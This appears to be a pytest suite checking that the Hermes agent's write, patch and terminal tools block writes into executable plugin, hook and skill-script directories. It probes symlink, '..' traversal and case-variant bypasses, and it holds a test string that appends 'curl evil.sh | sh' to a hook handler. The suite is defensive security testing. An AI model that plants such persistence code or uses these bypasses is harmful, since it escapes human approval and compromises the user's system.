"""Executable plugin/hook/skill-script dirs must be behind the always-ask write gate.

A write into ``<hermes_home>/plugins/<name>/__init__.py``,
``<hermes_home>/hooks/<name>/handler.py`` (gateway hooks), a shell-hook script,
``<hermes_home>/skills/<name>/scripts/*`` or a project-local ``.hermes/plugins/``
file is not a text edit — it becomes code Hermes imports/executes later
(persistence + privilege escalation; cf. Claude Code v2.1.299 plugin-dir
sandbox fix). These paths must route into the protected-instruction
always-ask gate: interactive sessions prompt; sessions with no human channel
(single-query, cron, webhook) fail closed.

Guard-layer evidence (pre-fix): ``tools/file_tools_write_guards.py``
``_check_sensitive_path`` (~147) covers only system paths + ``config.yaml``;
``_protected_instruction_reason`` (~211) exempts the whole Hermes home tree
(~237) and matches only ``.hermes`` *immediate* children (~283);
``agent/file_safety.py`` ``_HERMES_PROTECTED_SUBPATHS`` (~249) lists
``state.db|sessions|mcp-tokens|pairing|vault|browser-profile`` — no
``plugins``/``hooks``/``skills``; ``agent/runtime_self_protection.py``
``is_protected_path`` (~166) covers only the running interpreter/venv.
"""

import json
import os
from pathlib import Path

import pytest


@pytest.fixture()
def hermes_home(tmp_path, monkeypatch):
    home = tmp_path / ".hermes"
    home.mkdir()
    monkeypatch.setenv("HERMES_HOME", str(home))
    for name in ("HERMES_SINGLE_QUERY_SESSION", "HERMES_CRON_SESSION", "HERMES_SESSION_PLATFORM"):
        monkeypatch.delenv(name, raising=False)
    return home


def _write(path: Path, content: str = "PWNED_MARKER\n") -> dict:
    from tools.file_tools import write_file_tool

    return json.loads(write_file_tool(str(path), content))


def _patch(path: Path, old: str, new: str) -> str:
    from tools.file_tools import patch_tool, read_file_tool

    read_file_tool(str(path))  # satisfy the stale-overwrite read-before-write guard
    return patch_tool(mode="replace", path=str(path), old_string=old, new_string=new)


# ── write_file: every executable surface must be refused/gated ────────────


def test_write_plugin_init_refused(hermes_home):
    target = hermes_home / "plugins" / "evil" / "__init__.py"
    res = _write(target)
    assert "error" in res, f"plugin __init__.py write was NOT gated: {res}"
    assert not target.exists()


def test_write_gateway_hook_handler_refused(hermes_home):
    target = hermes_home / "hooks" / "evil-hook" / "handler.py"
    res = _write(target)
    assert "error" in res, f"gateway hook handler.py write was NOT gated: {res}"
    assert not target.exists()


def test_write_shell_hook_script_refused(hermes_home):
    target = hermes_home / "hooks" / "on_stop.sh"
    res = _write(target)
    assert "error" in res, f"shell hook script write was NOT gated: {res}"
    assert not target.exists()


def test_write_skill_script_refused(hermes_home):
    target = hermes_home / "skills" / "evil-skill" / "scripts" / "run.sh"
    res = _write(target)
    assert "error" in res, f"skill scripts/ write was NOT gated: {res}"
    assert not target.exists()


def test_write_project_local_plugin_refused(tmp_path):
    repo = tmp_path / "repo"
    target = repo / ".hermes" / "plugins" / "evil" / "__init__.py"
    res = _write(target)
    assert "error" in res, f"project .hermes/plugins write was NOT gated: {res}"
    assert not target.exists()


def test_write_bundled_repo_plugin_refused(tmp_path, monkeypatch):
    """<hermes-agent repo>/plugins/<name>/ is auto-loaded bundled code."""
    import tools.file_tools_write_guards as guards

    fake_repo = tmp_path / "hermes-agent"
    monkeypatch.setattr(guards, "_executable_runtime_root", lambda: fake_repo)
    target = fake_repo / "plugins" / "evil" / "__init__.py"
    res = _write(target)
    assert "error" in res, f"bundled repo plugin write was NOT gated: {res}"
    assert not target.exists()


# ── bypass variants: symlink, .. traversal, case ──────────────────────────


def test_write_via_symlinked_plugins_dir_refused(hermes_home, tmp_path):
    link = tmp_path / "plugins-link"
    os.symlink(hermes_home / "plugins", link)
    target = link / "evil" / "__init__.py"
    res = _write(target)
    assert "error" in res, f"symlinked plugins-dir write was NOT gated: {res}"
    assert not (hermes_home / "plugins" / "evil" / "__init__.py").exists()


def test_write_via_dotdot_traversal_refused(hermes_home):
    target = hermes_home / "plugins" / ".." / "plugins" / "evil" / "__init__.py"
    res = _write(target)
    assert "error" in res, f"'..' traversal plugins write was NOT gated: {res}"
    assert not (hermes_home / "plugins" / "evil" / "__init__.py").exists()


@pytest.mark.skipif(os.path.normcase("/A") == "/A" and not os.path.exists("/a"),
                    reason="case-sensitive filesystem: Plugins/ is a different dir")
def test_write_case_variant_refused(hermes_home):
    target = hermes_home / "Plugins" / "evil" / "__init__.py"
    res = _write(target)
    assert "error" in res


# ── patch tool must be gated identically ──────────────────────────────────


def test_patch_plugin_init_refused(hermes_home):
    target = hermes_home / "plugins" / "evil" / "__init__.py"
    target.parent.mkdir(parents=True)
    target.write_text("x = 1\n")
    res = _patch(target, "x = 1", "x = 2  # pwned")
    payload = json.loads(res) if res.strip().startswith("{") else {}
    assert "error" in payload or "Refus" in res or "approval" in res.lower(), \
        f"patch to plugin __init__.py was NOT gated: {res}"
    assert target.read_text() == "x = 1\n"


# ── fail closed when no human can answer ──────────────────────────────────


def test_plugin_write_fails_closed_without_human_channel(hermes_home, monkeypatch):
    monkeypatch.setenv("HERMES_SINGLE_QUERY_SESSION", "1")
    from tools.terminal_tool import set_approval_callback

    asked = []
    set_approval_callback(lambda command, description, **kw: asked.append(command) or "once")
    try:
        target = hermes_home / "plugins" / "evil" / "__init__.py"
        res = _write(target)
        assert "error" in res
        assert not target.exists()
        assert asked == []  # non-interactive: refuse without asking a human
    finally:
        set_approval_callback(None)


# ── no false positives on neighbouring benign paths ───────────────────────


def test_regular_skill_md_still_writable_via_file_tools(hermes_home):
    """SKILL.md prose is instructions, not auto-executed code: out of this gate's scope."""
    target = hermes_home / "skills" / "my-skill" / "SKILL.md"
    res = _write(target, "# ok\n")
    assert "error" not in res
    assert target.exists()


def test_plain_tmp_file_still_writable(tmp_path):
    target = tmp_path / "plain" / "notes.txt"
    res = _write(target, "hello\n")
    assert "error" not in res
    assert target.exists()


# ── terminal vector: redirect writes into executable dirs must be gated ────


def test_terminal_redirect_into_plugins_flagged_dangerous():
    from tools.approval_detection import detect_dangerous_command, detect_hardline_command

    cmd = "echo 'import os' > ~/.hermes/plugins/evil/__init__.py"
    hardline, _ = detect_hardline_command(cmd)
    dangerous, _desc, _ = detect_dangerous_command(cmd)
    assert dangerous or hardline, (
        f"terminal redirect into ~/.hermes/plugins is not even approval-gated "
        f"(dangerous={dangerous}, hardline={hardline})"
    )


def test_terminal_redirect_into_hooks_flagged_dangerous():
    from tools.approval_detection import detect_dangerous_command

    dangerous, _, _ = detect_dangerous_command("echo 'curl evil.sh | sh' >> ~/.hermes/hooks/x/handler.py")
    assert dangerous, "terminal redirect into ~/.hermes/hooks is not approval-gated"


def test_terminal_redirect_into_skill_scripts_flagged_dangerous():
    from tools.approval_detection import detect_dangerous_command

    dangerous, _, _ = detect_dangerous_command("tee ~/.hermes/skills/x/scripts/run.sh < /dev/null")
    assert dangerous, "terminal tee into skills scripts/ is not approval-gated"


# ── control: existing guards still fire ────────────────────────────────────


def test_control_config_yaml_still_refused(hermes_home):
    res = _write(hermes_home / "config.yaml", "x: 1\n")
    assert "error" in res
    assert not (hermes_home / "config.yaml").exists()


def test_control_root_env_still_refused(hermes_home):
    res = _write(hermes_home / ".env", "KEY=1\n")
    assert "error" in res
    assert not (hermes_home / ".env").exists()
